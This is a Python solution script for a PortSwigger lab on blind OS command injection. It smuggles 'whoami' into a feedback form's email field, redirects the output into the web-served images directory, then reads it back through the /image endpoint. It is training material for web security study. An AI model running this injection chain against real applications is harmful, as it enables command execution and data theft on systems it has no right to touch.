# Lab 03 — Blind OS command injection with output redirection
# PortSwigger: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
#
# Vulnerability: Same blind feedback function as Lab 02, but the application
#                separately serves static files from a predictable,
#                web-accessible directory (/var/www/images/, exposed via
#                the existing /image?filename= product image loader)
# Aim:           Execute whoami and retrieve its output by redirecting to a
#                file, then fetching that file through the image endpoint
#
# Technique:
#   1. Inject a command that WRITES whoami's output into a file inside the
#      web-accessible images directory.
#   2. Request that file directly via the app's own /image?filename=
#      mechanism — which was never intended to serve arbitrary text files,
#      but does so anyway because it has no extension/content validation.
#
# Usage: python os_command_injection_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from os_command_injection_utils import banner, section, make_session, submit_feedback, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

OUTPUT_FILENAME = "output.txt"
IMAGES_DIR = "/var/www/images"
INJECTED_EMAIL = f"||whoami>{IMAGES_DIR}/{OUTPUT_FILENAME}||"

if __name__ == "__main__":
    banner()
    section("LAB 03 — BLIND OS COMMAND INJECTION WITH OUTPUT REDIRECTION")

    if len(sys.argv) != 2:
        print("  Usage: python os_command_injection_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: inject the redirect-to-file payload ──────────────────────────
    print("  ── Step 1: submit feedback with output-redirection payload\n")
    print(f"  ➜  Payload (email field): {INJECTED_EMAIL}\n")

    r_submit = submit_feedback(session, url, INJECTED_EMAIL)
    check_status(r_submit, [200], "Feedback submission with redirect payload")

    # ── Step 2: fetch the file via the existing image loader ─────────────────
    print(f"\n  ── Step 2: fetch {OUTPUT_FILENAME} via the /image endpoint\n")
    r_fetch = session.get(f"{url}/image", params={"filename": OUTPUT_FILENAME})
    check_status(r_fetch, 200, f"GET /image?filename={OUTPUT_FILENAME}")

    print_box("Leaked command output (whoami)", r_fetch.text.strip())

    print()
    print("  ℹ  This technique depends on knowing (or discovering) a directory")
    print("     the application ALREADY serves static content from. The")
    print("     feedback form writes into that directory, then the unrelated")
    print("     image-loading feature reads it back out — chaining two")
    print("     otherwise-unremarkable features into a full data exfiltration path.")
